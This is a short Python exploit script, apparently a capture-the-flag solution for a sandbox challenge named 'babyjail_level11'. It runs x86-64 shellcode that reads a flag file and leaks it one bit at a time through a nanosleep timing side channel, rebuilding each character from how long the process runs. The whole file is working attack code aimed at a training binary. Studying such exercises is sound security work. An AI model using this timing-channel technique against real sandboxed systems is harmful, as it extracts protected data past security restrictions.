from pwn import log
from os import system
shellcode="""
mov rdi,3 ;\
mov rsi,0x1337100 ;\
mov rdx,0x100 ;\
xor rax,rax ;\
syscall ;\

xor rbx,rbx ;\
mov bl,[rsi+{}] ;\
shr bl,{} ;\
and bl,1 ;\
shl bl,2 ;\
push 0 ;\
push rbx ;\

mov rdi,rsp ;\
mov rsi,0 ;\
mov rax,35 ;\
syscall ;\
"""
gs="""
b *main+830
"""
flag = ''
for i in range(100):
    c=''
    for j in range(8):
        t=system("""
        asm -c "amd64" "{}" -f raw > /tmp/shellcode.bin
        start=$(date +%s)
        timeout 2s ./babyjail_level11 /flag < /tmp/shellcode.bin 1>/dev/null 2>/dev/null
        end=$(date +%s)
        exit  $(($end-$start))
        """.format(shellcode.format(i,j))) // 0x100
        if t>=2:
            t=1
        else:
            t=0
        c+=str(t)
    c=int(c[::-1],2)
    if not c:
        break
    log.info(chr(c))
    flag+=chr(c)
print(flag)